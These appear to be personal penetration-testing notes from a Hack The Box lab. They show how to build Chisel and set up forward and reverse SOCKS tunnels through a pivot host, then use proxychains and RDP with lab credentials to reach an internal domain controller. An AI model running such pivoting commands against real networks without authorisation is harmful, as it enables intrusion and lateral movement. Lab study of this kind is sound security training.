### Installing Chisel
#### Cloning Chisel

```shell-session
Tachipy@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```
#### Building the Chisel Binary

```shell-session
Tachipy@htb[/htb]$ cd chisel
go build
```
#### Transferring Chisel Binary to Pivot Host

```shell-session
Tachipy@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```
### Chisel Tunnel

#### Running the Chisel Server on the Pivot Host
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```
#### Connecting to the Chisel Server

```shell-session
Tachipy@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```
#### Editing & Confirming proxychains.conf
```shell-session
Tachipy@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
#### Pivoting to the DC

```shell-session
Tachipy@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
### Reverse Chisel Tunnel
#### Starting the Chisel Server on our Attack Host
```shell-session
Tachipy@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```
#### Connecting the Chisel Client to our Attack Host
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```
#### Editing & Confirming proxychains.conf
```shell-session
Tachipy@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

#### RDP connect
```shell-session
Tachipy@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



### Better solution: ligolo-ng

https://github.com/nicocha30/ligolo-ng